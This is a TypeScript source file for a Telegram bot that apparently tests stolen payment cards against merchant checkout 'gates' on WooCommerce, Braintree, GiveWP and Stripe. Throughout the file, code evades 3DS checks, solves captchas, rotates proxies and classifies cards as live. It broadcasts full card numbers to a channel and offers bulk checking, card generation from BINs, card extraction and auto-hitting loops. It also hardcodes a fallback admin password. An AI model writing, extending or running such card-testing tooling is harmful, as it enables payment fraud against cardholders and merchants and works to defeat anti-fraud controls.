      { key: "addPmPath",    label: "Add-PM Path",    type: "text",   example: "/my-account/add-payment-method  •  /account/payment/new",
                                                                                                                                    hint: "Path of the saved-card form (only for wc_braintree_addpm flow)." },
      { key: "btFlow",       label: "BT Flow",        type: "select", options: ["wc_braintree_addpm","wc_braintree","bigcommerce_stencil"],
                                                                                                                                    hint: "wc_braintree_addpm = saved cards; wc_braintree = checkout; bigcommerce_stencil = BigCommerce." },
    ],
  },
  vbv: {
    icon: "🔐", label: "3DS / VBV", fields: [
      { key: "vbvPreCheck",     label: "Enable Pre-check",   type: "bool",                                                          hint: "ON = run the 3DS likelihood probe before hitting the gate. Uses the endpoint below if set, else the BIN-country heuristic." },
      { key: "vbvEndpoint",     label: "VBV Endpoint",       type: "text", example: "https://your-vbv.example/check  •  (blank = BIN heuristic)", hint: "Bring-your-own VBV service. Blank falls back to env VBV_CHECK_ENDPOINT, or the built-in BIN heuristic if neither set." },
      { key: "vbvSkipDeclined", label: "Skip on Declined",   type: "bool",                                                          hint: "ON = short-circuit when the external endpoint returns 'declined' (saves a gate hit). Has no effect when no endpoint is configured." },
      { key: "vbvSkip3dsBin",   label: "Skip likely-3DS",    type: "bool",                                                          hint: "ON = treat this gate as non-3DS-capable. Cards whose BIN country mandates SCA (EEA/UK/IN) are skipped instead of returning requires_action." },
    ],
  },
  captcha: {
    icon: "🛡", label: "Captcha", fields: [
      { key: "captchaProvider", label: "Provider", type: "select", options: ["2captcha","anticaptcha"] },
      { key: "captchaApiKey",   label: "API Key",  type: "text", example: "a1b2c3d4e5f6…",                                          hint: "Your solver service API key." },
      { key: "captchaType",     label: "Type",     type: "select", options: ["recaptcha","hcaptcha","turnstile","sgcaptcha"] },
      { key: "captchaSiteKey",  label: "Site Key", type: "text", example: "6Le-…  •  0x4AAA…",                                      hint: "The captcha widget's site key from the page's HTML." },
    ],
  },
  proxy: {
    icon: "🌍", label: "Proxy / Net", fields: [
      { key: "proxyCountry",  label: "Proxy Country", type: "text",   example: "US  •  GB  •  DE",                                  hint: "ISO-2 country code. Filters the proxy pool." },
      { key: "proxyOverride", label: "Sticky Proxy",  type: "text",   example: "http://user:pass@host:8080  •  socks5://host:1080", hint: "Pins this gate to one proxy instead of rotating." },
      { key: "rawCookies",    label: "Raw Cookies",   type: "text",   example: "wordpress_logged_in=…; PHPSESSID=…",                hint: "Cookie header used as-is for every request." },
      { key: "timeout",       label: "Timeout (ms)",  type: "number", example: "20000",                                             hint: "Per-HTTP-call timeout. Default 12000." },
      { key: "maxRetries",    label: "Max Retries",   type: "number", example: "2",                                                 hint: "Network-retry count on transient failures." },
      { key: "userAgent",     label: "Custom UA",     type: "text",   example: "Mozilla/5.0 (Windows NT 10.0…) Chrome/142…",        hint: "Pins UA instead of rotating from the pool." },
    ],
  },
  overrides: {
    icon: "⚙️", label: "Overrides", fields: [
      { key: "liveOverrides",    label: "Force Live (csv)",  type: "csv",  example: "your bank phrase, another phrase",              hint: "Comma-list. Any of these substrings in the response → LIVE." },
      { key: "deadOverrides",    label: "Force Dead (csv)",  type: "csv",  example: "specific decline message",                      hint: "Comma-list. Any of these substrings → DEAD (loses to liveOverrides if both hit)." },
      { key: "binBlacklist",     label: "BIN Blacklist",     type: "text", example: "411111,453953,520082",                          hint: "Comma-list of BIN prefixes. Cards starting with any prefix are rejected before the gateway call." },
      { key: "testCardOverride", label: "Test Card",         type: "text", example: "4242424242424242|12|2030|123",                  hint: "Card used by /aiconfig calibration when set." },
      { key: "autoValidate",     label: "Validate on Save",  type: "bool", hint: "ON = run a test card after every /editgate save." },
    ],
  },
};

function fmtValue(v: any, type: FieldDef["type"]): string {
  if (v === undefined || v === null || v === "") return "—";
  if (type === "bool") return v === true || v === "true" ? "ON" : "OFF";
  if (type === "csv" && Array.isArray(v)) return v.join(", ") || "—";
  const s = String(v);
  return s.length > 28 ? s.slice(0, 26) + "…" : s;
}
function getFieldValue(gate: any, field: FieldDef): any {
  return field.topLevel ? gate[field.key] : (gate.settings || {})[field.key];
}
async function setFieldValue(gateId: string, field: FieldDef, value: any): Promise<void> {
  const gate = await storage.getGateConfig(gateId);
  if (!gate) throw new Error("gate gone");
  if (field.topLevel) {
    // Never push undefined to a top-level column — drizzle skips it silently for
    // some drivers and rejects with a NOT-NULL violation on others. Coerce to
    // empty string for nullable text columns, and refuse to clear required ones.
    if (value === undefined || value === null) {
      if (REQUIRED_TOP_LEVEL.has(field.key)) throw new Error(`${field.label} is required — can't clear`);
      value = "";
    }
    await storage.updateGateConfig(gateId, { [field.key]: value } as any);
  } else {
    const settings = { ...((gate.settings as any) || {}) };
    if (value === undefined || value === null || value === "") delete settings[field.key];
    else settings[field.key] = value;
    await storage.updateGateConfig(gateId, { settings } as any);
  }
}

function renderCategoryMenu(gate: any): { text: string; keyboard: any[][] } {
  const s = (gate.settings || {}) as Record<string, any>;
  // Pre-compute a concise "what's set" line per category so the operator sees
  // at a glance which categories already have configured values vs. are empty.
  const tags: string[] = [];
  if (s.publicKey || s.btClientToken || s.connectedAccount || s.stripeAccount) tags.push("🔑 keys");
  if (s.giveFormId || s.gfFormId || s.charitableFormId || s.donatePath || s.giveFormIdPrefix) tags.push("🌐 form");
  if (s.wcNonce || s.wcStoreNonce || s.ajaxNonce || s.gfPaymentIntentNonce) tags.push("📝 nonces");
  if (s.vbvPreCheck) tags.push("🔐 3DS");
  if (s.captchaApiKey || s.captchaType) tags.push("🛡 captcha");
  if (s.proxyOverride || s.proxyCountry || s.rawCookies) tags.push("🌍 proxy");
  if ((s.liveOverrides && s.liveOverrides.length) || (s.deadOverrides && s.deadOverrides.length) || s.binBlacklist) tags.push("⚙️ overrides");
  const countryLine = gate.country ? ` · 🧭 ${gate.country.toUpperCase()}` : "";
  const text = `🛠 *Edit Gate*: \`${tgEscape(gate.name)}\`\n` +
               `Type: ${gate.gateType.toUpperCase()} · ${tgEscape(gate.subType || "standard")}${countryLine}\n` +
               `Status: ${gate.active ? "🟢 active" : "🔴 inactive"}\n` +
               `Configured: ${tags.length ? tags.join(" · ") : "_(only basics)_"}\n\n` +
               `Pick a category:`;
  const cats = Object.entries(FIELD_GROUPS);
  const keyboard: any[][] = [];
  for (let i = 0; i < cats.length; i += 2) {
    const row: any[] = [];
    for (const [key, g] of cats.slice(i, i + 2)) {
      row.push({ text: `${g.icon} ${g.label}`, callback_data: `eg_cat_${key}` });
    }
    keyboard.push(row);
  }
  keyboard.push([{ text: "🔍 Find Field", callback_data: "eg_find" }]);
  keyboard.push([{ text: "✖️ Close", callback_data: "eg_close" }]);
  return { text, keyboard };
}

// Search across every field group for a substring match in key or label.
// Returns up to 12 matches with a button per hit.
function renderFieldSearch(gate: any, query: string): { text: string; keyboard: any[][] } {
  const q = query.trim().toLowerCase();
  const hits: Array<{ cat: string; field: FieldDef }> = [];
  for (const [catKey, grp] of Object.entries(FIELD_GROUPS)) {
    for (const f of grp.fields) {
      if (f.key.toLowerCase().includes(q) || f.label.toLowerCase().includes(q)) {
        hits.push({ cat: catKey, field: f });
      }
    }
  }
  const capped = hits.slice(0, 12);
  let text = `🔍 *Search:* \`${tgEscape(query)}\`\n`;
  text += hits.length === 0 ? `No matches.` : `${hits.length} match${hits.length === 1 ? "" : "es"}${hits.length > 12 ? " (showing 12)" : ""}:`;
  const keyboard: any[][] = [];
  for (const { cat, field } of capped) {
    const v = fmtValue(getFieldValue(gate, field), field.type).replace(/`/g, "'");
    const grpIcon = FIELD_GROUPS[cat]?.icon || "•";
    keyboard.push([{ text: `${grpIcon} ${field.label}: ${v}`, callback_data: `eg_field_${cat}_${field.key}` }]);
  }
  keyboard.push([{ text: "🔍 New Search", callback_data: "eg_find" }, { text: "⬅️ Back", callback_data: "eg_back" }]);
  return { text, keyboard };
}

function renderFieldList(gate: any, categoryKey: string): { text: string; keyboard: any[][] } | null {
  const grp = FIELD_GROUPS[categoryKey];
  if (!grp) return null;
  let text = `${grp.icon} *${grp.label}* — current values:\n\n`;
  const keyboard: any[][] = [];
  for (const f of grp.fields) {
    const v = fmtValue(getFieldValue(gate, f), f.type);
    // Backticks would break the inline-code block; replace with a single quote.
    const safe = v.replace(/`/g, "'");
    text += `• *${f.label}*: \`${safe}\`\n`;
    keyboard.push([{ text: `✏️ ${f.label}: ${v}`, callback_data: `eg_field_${categoryKey}_${f.key}` }]);
  }
  keyboard.push([{ text: "⬅️ Back", callback_data: "eg_back" }]);
  return { text, keyboard };
}

function findField(category: string, key: string): FieldDef | null {
  return FIELD_GROUPS[category]?.fields.find(f => f.key === key) || null;
}

// Top-level fields that the gate cannot lose — empty string would brick the gate.
const REQUIRED_TOP_LEVEL = new Set(["name", "url", "gateType"]);
/** Escape Telegram Markdown (v1) special chars so user-typed gate names render safely. */
function tgEscape(s: string): string {
  return String(s).replace(/[_*`\[\]]/g, m => "\\" + m);
}
const pendingMassChecks = new Map<string, { cards: string[]; gateId?: string }>();
// Stop-request flag set by the inline STOP button on the mass-check progress
// message. The mass loop checks this at the top of each iteration and bails.
const massStopRequested = new Set<string>();
// Per-admin gate watch subscriptions: telegramId → Set<gateId>
const adminWatchedGates = new Map<string, Set<string>>();
// Per-admin auto-hitter jobs
const autoHitJobs = new Map<string, { stop: () => void }>();

async function getAdminPassword(): Promise<string> {
  const settings = await storage.getBotSettings();
  return settings.adminPassword || "926696";
}

/** Returns true if a result string is a low-confidence "tokenize-only" hit
 *  (Stripe accepted the card object but no charge/decline-code came back).
 *  We intentionally drop these from channel notifications so the live feed
 *  only contains bank-confirmed or bank-signal-bearing cards. */
function isTokenizeOnlyResult(response: string): boolean {
  const s = (response || "").toLowerCase();
  // Patterns emitted by formatCardResult / tokenize fallback paths
  if (s.includes("no bank confirm")) return true;
  if (s.includes("auth checkout unreachable")) return true;
  if (/^ccn\s+(live|⚠).*tokenized/i.test(response)) return true;
  if (/^ccn\s+⚠/.test(response)) return true; // warning-tier tokenize
  return false;
}

/** Shared parser for the pipe-delimited response string emitted by the
 *  checker. Used by both formatCheckResult (the /chk reply) and
 *  notifyLiveCardToChannel (the channel broadcast + watched-gate DMs) so all
 *  surfaces render identically — Card → Result → Info → Amount → Bank → Proxy
 *  → Intent. */
interface ParsedResponseParts {
  headline: string;     // first segment, e.g. "CCN LIVE ⚡ Do Not Honor"
  cardInfo: string;     // "DISCOVER credit [US]"
  amount: string;       // "$2.00 (pid 1822)"
  bankName: string;     // "Chase Bank (PLATINUM) 🇺🇸"
  proxyTag: string;     // "pool" / "pool:US" / "sticky:1.2.3.4:8080"
  address: string;      // "10025 215 West 92nd Street, NY US" — billing address used
  chargeTok: string;    // "ch_..."
  intentTok: string;    // "pi_..." / "seti_..."
  tokenTok: string;     // "tok_..." / "pm_..."
  declineCode: string;  // when headline contains "DECLINED ✗ X"
  isTokenOnly: boolean;
}

function parseRichResponse(response: string): ParsedResponseParts {
  const respParts = response.split("|").map(s => s.trim());
  const out: ParsedResponseParts = {
    headline: respParts[0] || response,
    cardInfo: "", amount: "", bankName: "", proxyTag: "", address: "",
    chargeTok: "", intentTok: "", tokenTok: "",
    declineCode: "", isTokenOnly: false,
  };
  for (const p of respParts) {
    if (/^(VISA|MASTERCARD|AMEX|DISCOVER|JCB|DINERS)\b/i.test(p)) {
      out.cardInfo = p;
    } else if (/^\$\d/.test(p)) {
      out.amount = p;
    } else if (/^🏦/.test(p)) {
      out.bankName = p.replace(/^🏦\s*/, "");
    } else if (/^🛰/.test(p)) {
      out.proxyTag = p.replace(/^🛰\s*/, "");
    } else if (/^📍/.test(p)) {
      // Billing address echo from formatCardResult — must be matched BEFORE the
      // generic bankName fallback below or it gets mislabeled as "Bank: 📍 …".
      out.address = p.replace(/^📍\s*/, "");
    } else if (/PM Only|No Bank|GiveWP.*No Bank/i.test(p)) {
      out.isTokenOnly = true;
    } else if (p.startsWith("ch_")) out.chargeTok = p;
    else if (/^(pi_|seti_)/.test(p)) out.intentTok = p;
    else if (/^(tok_|pm_|src_)/.test(p)) out.tokenTok = p;
    else if (p !== out.headline && !out.cardInfo && /debit|credit|prepaid/i.test(p)) {
      out.cardInfo = p;
    } else if (p !== out.headline && p !== out.cardInfo && p.length > 2 && !/^(CVV|3DS|NO-3DS)/.test(p) && !/^\$/.test(p)) {
      if (!out.bankName) out.bankName = p;
    }
  }
  const declineMatch = response.match(/(?:DECLINED\s*✗?\s*)([^|]+)/i);
  if (declineMatch) out.declineCode = declineMatch[1].trim();
  return out;
}

function proxyLabel(tag: string): string {
  if (!tag) return "";
  const sticky = tag.match(/^sticky:(.+)$/);
  if (sticky) return `sticky \`${tgEscape(sticky[1])}\``;
  const pool = tag.match(/^pool:?(.*)$/);
  if (pool && pool[1]) return `${pool[1].toUpperCase()} pool`;
  return "rotating pool";
}

/** Build the shared body of the rich response block (Info/Amount/Bank/Proxy/
 *  token lines + 3DS hints). Used by both the /chk reply and the channel post
 *  so admins see the same layout everywhere. Returns Markdown ready to drop
 *  between a header and a footer. */
function buildRichBlock(parts: ParsedResponseParts, result: { status: string; response: string }, opts: { is3ds?: boolean } = {}): string {
  const masked = isMaskEnabled();
  let block = "";
  if (parts.cardInfo)  block += `*Info:* ${parts.cardInfo}\n`;
  if (parts.amount)    block += `*Amount:* ${parts.amount}\n`;
  if (parts.bankName)  block += `*Bank:* ${tgEscape(parts.bankName)}\n`;
  // Address echo from formatCardResult — only present on charged / CVV-match /
  // 3DS outcomes, so it's a useful "this is the billing combo that produced
  // the AVS code" line.
  if (parts.address)   block += `*Address:* ${tgEscape(parts.address)}\n`;
  if (parts.proxyTag) {
    const label = proxyLabel(parts.proxyTag);
    if (label) block += `*Proxy:* ${label}\n`;
  }
  if (parts.chargeTok) {
    block += `*Charge:* \`${masked ? maskChargeId(parts.chargeTok) : parts.chargeTok}\`\n`;
  } else if (parts.intentTok) {
    block += `*Intent:* \`${masked ? maskIntentId(parts.intentTok) : parts.intentTok}\`\n`;
  }
  // 3DS — render attempt + clickable URL when present
  const threeDsUrl    = (result as any).threeDsUrl as string | undefined;
  const threeDsType   = (result as any).threeDsType as ("redirect" | "sdk" | "none" | undefined);
  const threeDsAttempt = (result as any).threeDsAttempt as ("frictionless_passed" | "frictionless_failed" | "challenge_only" | undefined);
  if (opts.is3ds) {
    if (threeDsAttempt === "frictionless_failed") block += `*3DS:* Frictionless attempted, bank requires full challenge\n`;
    else if (threeDsAttempt === "challenge_only") block += `*3DS:* Challenge required (no frictionless probe)\n`;
    if (threeDsType === "redirect" && threeDsUrl) block += `*3DS URL:* [open challenge](${threeDsUrl})\n`;
    else if (threeDsType === "sdk")               block += `*3DS Type:* Stripe.js fingerprint (no clickable URL; requires JS env)\n`;
    else if (parts.intentTok)                     block += `*3DS Action:* Complete via Stripe SDK with intent above\n`;
  } else if (threeDsAttempt === "frictionless_passed") {
    block += `*3DS:* Frictionless ✓ — bank auto-authenticated\n`;
  }
  if (parts.isTokenOnly) block += `*Note:* ⚠ No bank confirmation\n`;
  return block;
}

export async function notifyLiveCardToChannel(
  cardFull: string,
  result: { status: string; response: string; latency: number },
  gateName: string,
  checkedBy: string,
  gateId?: string,
): Promise<void> {
  if (result.status !== "approved") return;
  if (!bot) return;
  // Tokenize-only hits don't have a bank verdict — they're essentially
  // "Stripe accepted the card object". Suppress them from the channel feed
  // (admins specifically asked for bank-confirmed lives only).
  if (isTokenizeOnlyResult(result.response)) {
    try { console.log(`[notify] suppressed tokenize-only result for ${cardFull.split("|")[0].slice(0, 6)}**: ${result.response.slice(0, 80)}`); } catch {}
    return;
  }
  try {
    const freshSettings = await storage.getBotSettings();
    const latencyStr = result.latency >= 1000 ? `${(result.latency / 1000).toFixed(1)}s` : `${result.latency}ms`;
    const parts = parseRichResponse(result.response);

    // Headline classifier — same precedence as formatCheckResult so the
    // channel + /chk + watched-DMs all render with the same tier icon.
    const mainResult = parts.headline;
    const isCvvLive = /CVV LIVE/i.test(mainResult);
    const isCcnLive = /CCN LIVE/i.test(mainResult);
    const is3ds     = /3DS/i.test(mainResult);
    let statusIcon = "✅", statusLabel = "LIVE";
    if (isCvvLive)      { statusIcon = "🟢"; statusLabel = "CVV LIVE"; }
    else if (is3ds)     { statusIcon = "🟡"; statusLabel = "3DS REQUIRED"; }
    else if (isCcnLive) { statusIcon = "🟡"; statusLabel = "CCN LIVE"; }

    // Result detail extracted from the headline so we always have a clean
    // one-liner ("Do Not Honor", "3DS Required", etc.)
    const detailMatch = mainResult.match(/^(?:CVV LIVE|CCN LIVE|DECLINED|GATEWAY|CCN ⚠)\s*[✓⚡✗⚠]?\s*(.+?)$/i);
    const detailText = detailMatch?.[1]?.trim() || mainResult;

    let msg = `🔔 *${statusLabel}*\n━━━━━━━━━━━━━━━━━━━━\n`;
    // Respect the operator's /maskcc setting — default is OFF (full PAN shown).
    // Channel members see the same card as the operator unless /maskcc is on.
    msg += `*Card:* \`${isMaskEnabled() ? maskCardLine(cardFull) : cardFull}\`\n`;
    msg += `*Result:* ${statusIcon} ${tgEscape(detailText)}\n`;
    msg += buildRichBlock(parts, result, { is3ds });
    msg += `\n*Gate:* ${tgEscape(gateName)}  ·  *By:* ${tgEscape(checkedBy)}  ·  *Time:* ${latencyStr}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━`;

    // Send to main channel — when Markdown fails, fall back to plain text so
    // a bad bank-name character or stray asterisk doesn't silently drop the
    // post. Failures now log to console so admins can see WHY nothing arrived.
    if (!isFeatureEnabled("channel_post")) {
      console.log("[notify] channel_post feature is OFF — skipping.");
    } else if (freshSettings.sendLiveToChannel !== false && freshSettings.chatId) {
      const chatIdForSend = freshSettings.chatId;
      // Fix 4: queue the send so a busy mass-check doesn't burn through
      // Telegram's 20-msg/min channel cap. Each send waits at least 3s
      // after the previous one. Fire-and-forget remains the calling
      // contract — we don't await this here.
      enqueueChannelSend(async () => {
        try {
          await bot!.sendMessage(chatIdForSend, msg, { parse_mode: "Markdown" });
        } catch (e: any) {
          console.error(`[notify] channel post failed (Markdown), retrying plain: ${e?.message ?? e}`);
          try {
            await bot!.sendMessage(chatIdForSend, msg.replace(/[*_`\[\]()]/g, ""), { disable_web_page_preview: true });
          } catch (e2: any) {
            console.error(`[notify] channel post failed (plain too): ${e2?.message ?? e2}`);
            // Fix 2: surface the failure once to the owner so they can fix
            // the channel config — silent vanishing was the worst outcome.
            await notifyOwnerOfChannelFailure(e2?.message ?? String(e2), chatIdForSend);
          }
        }
      });
    } else if (!freshSettings.chatId) {
      console.warn("[notify] no chatId configured in bot_settings — live posts disabled. Set it via the BotSettings page or POST /api/bot-settings.");
      // Fix 2 (cont.): the no-chatId case is also a misconfiguration — DM
      // the owner so they notice once per restart. After 5 live hits with
      // no chatId, the operator is probably losing valuable data.
      await notifyOwnerOfChannelFailure("chatId is not configured", undefined);
    } else if (freshSettings.sendLiveToChannel === false) {
      console.log("[notify] sendLiveToChannel is OFF — skipping channel post.");
    }

    // DM admins watching this specific gate
    if (gateId) {
      for (const [adminId, watchedIds] of adminWatchedGates.entries()) {
        if (watchedIds.has(gateId) && adminId !== checkedBy) {
          try {
            await bot.sendMessage(adminId, `👁 *Watched Gate Hit!*\n${msg}`, { parse_mode: "Markdown" });
          } catch (e: any) {
            console.error(`[notify] watch DM to ${adminId} failed: ${e?.message ?? e}`);
          }
        }
      }
    }
  } catch (e: any) {
    console.error(`[notify] notifyLiveCardToChannel outer error: ${e?.message ?? e}`);
  }
}

function buildProgressBar(current: number, total: number, width: number = 20): string {
  const pct = Math.min(current / total, 1);
  const filled = Math.round(pct * width);
  const empty = width - filled;
  return "█".repeat(filled) + "░".repeat(empty);
}

function pick<T>(arr: T[]): T { return arr[Math.floor(Math.random() * arr.length)]; }

function isAdmin(telegramId: string, botUser: any, ownerId?: string | null): boolean {
  return adminSessions.has(telegramId)
    || botUser?.role === "owner"
    || botUser?.role === "admin"
    || (!!ownerId && telegramId === ownerId);
}

/** Owner-only check — used to gate admin-management commands so a promoted
 *  admin can't escalate by adding more admins or removing the owner. */
function isOwner(telegramId: string, botUser: any, ownerId?: string | null): boolean {
  return botUser?.role === "owner" || (!!ownerId && telegramId === ownerId);
}

async function checkAdmin(telegramId: string, botUser: any): Promise<boolean> {
  const freshSettings = await storage.getBotSettings();
  return isAdmin(telegramId, botUser, freshSettings.ownerId);
}

async function checkOwner(telegramId: string, botUser: any): Promise<boolean> {
  const freshSettings = await storage.getBotSettings();
  return isOwner(telegramId, botUser, freshSettings.ownerId);
}

/**
 * Public-facing command catalog. Each entry: { command, description, scope }.
 *   scope = "user"   → visible to every user once bot opens
 *   scope = "admin"  → visible only after /login
 *   scope = "owner"  → reserved for owner; we don't expose in the menu
 * Only `command` (without /) + `description` are sent to Telegram setMyCommands.
 * The scope is local — we filter who sees what by setting different command
 * scopes via setMyCommands' `scope` parameter when supported.
 */
const BOT_COMMANDS_CATALOG: Array<{ cmd: string; desc: string; scope: "user" | "admin"; feature?: FeatureKey }> = [
  // Public — visible to anyone who opens the bot
  { cmd: "start",      desc: "Open the bot and see your status",               scope: "user" },
  { cmd: "help",       desc: "Command reference",                              scope: "user" },
  { cmd: "redeem",     desc: "Redeem an access key (KEY)",                     scope: "user" },
  { cmd: "chk",        desc: "Check one card: /chk CC|MM|YYYY|CVV",            scope: "user", feature: "chk" },
  { cmd: "mass",       desc: "Bulk check (reply with .txt or paste lines)",    scope: "user", feature: "mass" },
  { cmd: "gen",        desc: "Generate cards from a BIN",                      scope: "user", feature: "gen" },
  { cmd: "ccex",       desc: "Extract cards from pasted text",                 scope: "user", feature: "ccex" },
  { cmd: "binex",      desc: "Extract BINs from pasted text",                  scope: "user", feature: "binex" },
  { cmd: "notify",     desc: "Toggle live-card DM alerts",                     scope: "user" },
  { cmd: "myinfo",     desc: "Your usage + key status",                        scope: "user" },
  { cmd: "stats",      desc: "Today's stats",                                  scope: "user" },
  // Admin — visible after /login (still in the catalog so /help is complete)
  { cmd: "login",      desc: "Admin login (PASS)",                             scope: "admin" },
  { cmd: "gates",      desc: "List gates",                                     scope: "admin" },
  { cmd: "setgate",    desc: "Pick which gate to use",                         scope: "admin" },
  { cmd: "randomgate", desc: "Toggle random-gate mode",                        scope: "admin" },
  { cmd: "autoroute",  desc: "Toggle US-card→US-gate routing",                 scope: "admin" },
  { cmd: "maskcc",     desc: "Toggle PAN/charge/intent masking",               scope: "admin" },
  { cmd: "editgate",   desc: "Edit a gate's config inline",                    scope: "admin", feature: "editgate" },
  { cmd: "addgate",    desc: "Add a new gate (auto-detect or manual)",         scope: "admin" },
  { cmd: "hit",        desc: "Single Stripe-checkout hit",                     scope: "admin", feature: "hit" },
  { cmd: "autohit",    desc: "Auto-hit loop (URL BIN delay)",                  scope: "admin", feature: "autohit" },
  { cmd: "miner",      desc: "Server-miner control",                           scope: "admin", feature: "miner" },
  { cmd: "mine",       desc: "Range miner — custom BIN range mining",           scope: "admin", feature: "mine" },
  { cmd: "watch",      desc: "Watch a gate for live results (DM)",             scope: "admin", feature: "watch" },
  { cmd: "3ds",        desc: "Inspect a 3DS challenge URL",                    scope: "admin", feature: "threeds_inspect" },
  { cmd: "aiconfig",   desc: "AI gate auto-configure",                         scope: "admin", feature: "ai_config" },
  { cmd: "ai",         desc: "Admin chat with the AI analyzer",                scope: "admin", feature: "ai_chat" },
  { cmd: "features",   desc: "Toggle bot features on/off",                     scope: "admin" },
  { cmd: "export",     desc: "Export check history as CSV",                    scope: "admin" },
  { cmd: "broadcast",  desc: "Broadcast a message to all users",               scope: "admin" },
  { cmd: "testchannel", desc: "Verify live-card broadcast wiring",              scope: "admin" },
];

/**
 * Push the current command catalog to Telegram's setMyCommands so users see
 * "/" autocomplete entries instead of having to memorize commands. Filtered
 * by feature toggles — disabled commands are hidden from the menu so users
 * don't get a "🚫 disabled by owner" reply when they tap an entry.
 *
 * Telegram's setMyCommands supports per-scope lists (default / all_chat /
 * chat / chat_admins). We send "default" with the user-scope set; admin
 * commands stay in the catalog for /help but aren't pushed to Telegram so
 * regular users don't see them in autocomplete.
 *
 * Safe to call repeatedly — Telegram dedupes by content.
 */
async function syncBotCommandsMenu(): Promise<void> {
  if (!bot) return;
  const visible = BOT_COMMANDS_CATALOG
    .filter(c => c.scope === "user")
    .filter(c => !c.feature || isFeatureEnabled(c.feature))
    .map(c => ({ command: c.cmd, description: c.desc.slice(0, 256) })); // Telegram caps at 256 chars
  try {
    await bot.setMyCommands(visible, { scope: { type: "default" } } as any);
    console.log(`[telegram] command menu synced — ${visible.length} commands visible to users`);
  } catch (e: any) {
    console.error(`[telegram] setMyCommands failed: ${e?.message || e}`);
  }
}

// ── Tiered access (channel-member free tier) ────────────────────────────────
// Four tiers, evaluated in order:
//   admin    — owner / admin-password verified
//   redeemed — user has a valid (unexpired) access key
//   free     — freeTierEnabled is on AND user is a member of the broadcast channel
//   guest    — none of the above; can only /start, /help, /redeem
// Free-tier users can use /chk only and only up to settings.freeTierDailyLimit.
// All other user-facing commands continue to require redeemed-or-admin.
type UserTier = "admin" | "redeemed" | "free" | "guest";

/**
 * Check live whether `telegramId` is currently a member of the broadcast
 * channel. Calls Telegram's getChatMember API every time (no cache) — adds
 * ~50-100ms per /chk for free users, which is the cost of the access model.
 * Returns false on any error (channel not set, bot lacks access, user not
 * found, network blip) — fail-closed so we never grant access we can't verify.
 */
async function isChannelMember(telegramId: string, chatId: string | null | undefined): Promise<boolean> {
  if (!bot || !chatId || !telegramId) return false;
  try {
    // node-telegram-bot-api's getChatMember signature wants a number for
    // user_id but a string for chat_id. Telegram itself accepts either —
    // we cast through `any` to keep our string-everywhere convention.
    const member = await (bot as any).getChatMember(chatId, telegramId);
    // "left" and "kicked" mean they're NOT a current member. Everything else
    // ("creator", "administrator", "member", "restricted") counts as in.
    return member?.status !== "left" && member?.status !== "kicked";
  } catch (e: any) {
    // Common: "user not found" when they were never in the channel; "Bad
    // Request" when the channel id is wrong or the bot isn't admin there.
    // Either way: not verifiable → not a member.
    return false;
  }
}

/**
 * Resolve a user's effective access tier. Pure function over current state —
 * call it at the top of any command handler that should respect tiering.
 */
async function getUserTier(telegramId: string, botUser: any): Promise<UserTier> {
  // Admin first — overrides everything else (also handles the case where the
  // owner doesn't have a botUser row yet on first interaction).
  if (await checkAdmin(telegramId, botUser)) return "admin";
  if (botUser?.banned) return "guest";
  // Redeemed: keyId present AND the key still valid.
  if (botUser?.keyId) {
    const key = await storage.getAccessKeyById(botUser.keyId);
    if (key && (!key.expiresAt || new Date(key.expiresAt) > new Date())) return "redeemed";
  }
  // Free tier — only when explicitly enabled in settings AND the user is
  // currently a member of the broadcast channel. Live check, no caching.
  const settings = await storage.getBotSettings();
  if (settings.freeTierEnabled && settings.chatId && await isChannelMember(telegramId, settings.chatId)) {
    return "free";
  }
  return "guest";
}

function maskGateName(name: string): string {
  if (name.length <= 6) return name.substring(0, 2) + "***";
  return name.substring(0, 3) + "***" + name.slice(-3);
}

/**
 * Parse cards from any text blob into canonical `PAN|MM|YYYY|CVV` lines that
 * the gate checker accepts. This is the single source of truth used by BOTH
 * the interactive /mass listener and the .txt-upload path so they behave
 * identically.
 *
 * Two strategies, merged + de-duplicated:
 *   1. Line-by-line via parseCardInputDetailed — handles |, :, ;, comma,
 *      space, and tab delimiters, validates Luhn, and is the most reliable
 *      for clean one-card-per-line lists (the common case).
 *   2. extractCards — regex-scans the WHOLE blob for card-shaped digit runs
 *      with nearby expiry/CVV. Catches cards embedded in prose, labels, or
 *      log dumps that the line parser misses.
 *
 * Returns canonical strings; the year is normalized to 4 digits so downstream
 * formatting is consistent (20YY for 2-digit input).
 */
function parseCardsBlob(text: string): string[] {
  const seen = new Set<string>();   // keyed by PAN to dedup across strategies
  const out: string[] = [];

  const push = (number: string, month: string, year: string, cvv: string) => {
    if (seen.has(number)) return;
    seen.add(number);
    const yyyy = year.length === 2 ? `20${year}` : year;
    out.push(`${number}|${month.padStart(2, "0")}|${yyyy}|${cvv}`);
  };

  // Strategy 1 — per-line parse (handles every delimiter parseCardInput knows)
  for (const rawLine of text.split(/\r?\n/)) {
    const line = rawLine.trim();
    if (!line || line.startsWith("#") || line.startsWith("//")) continue;
    const parsed = parseCardInputDetailed(line);
    if ("number" in parsed) push(parsed.number, parsed.month, parsed.year, parsed.cvv);
  }

  // Strategy 2 — whole-blob regex extraction for anything line-parse missed
  // (embedded in text, weird spacing). extractCards emits "PAN|MM|YY|CVV"
  // with possible trailing-empty fields for bare PANs — keep only complete ones.
  for (const c of extractCards(text)) {
    const parts = c.split("|");
    if (parts.length === 4 && parts.every(p => p.length > 0)) {
      push(parts[0], parts[1], parts[2], parts[3]);
    }
  }

  return out;
}

function timeAgo(date: Date | null | undefined): string {
  if (!date) return "?";
  const diff = Date.now() - new Date(date).getTime();
  const mins = Math.floor(diff / 60000);
  if (mins < 1) return "just now";
  if (mins < 60) return `${mins}m ago`;
  const hrs = Math.floor(mins / 60);
  if (hrs < 24) return `${hrs}h ago`;
  return `${Math.floor(hrs / 24)}d ago`;
}

async function getGateForUser(telegramId: string, cardStr?: string): Promise<any | null> {
  const allGates = await storage.getGateConfigs();
  // Filter out unsupported gates (SaaS auto-detected before refusal logic, or
  // accidentally saved with gateType="unsupported"). Picking one would route
  // cards to a checker flow that doesn't exist and silently fail.
  const activeGates = allGates.filter(g => g.active && g.gateType !== "unsupported");
  if (activeGates.length === 0) return null;

  const botUser = await storage.getBotUser(telegramId);
  const hasAdminAccess = await checkAdmin(telegramId, botUser);

  if (hasAdminAccess) {
    // Auto-route (highest priority): card BIN country → same-country gate.
    if (cardStr && (userAutoRoute.get(telegramId) ?? false)) {
      const parsed = parseCardInputDetailed(cardStr);
      if (parsed && "number" in parsed) {
        let cc = "";
        try { cc = (await lookupBin(parsed.number))?.country || ""; } catch { /* unknown → fall back */ }
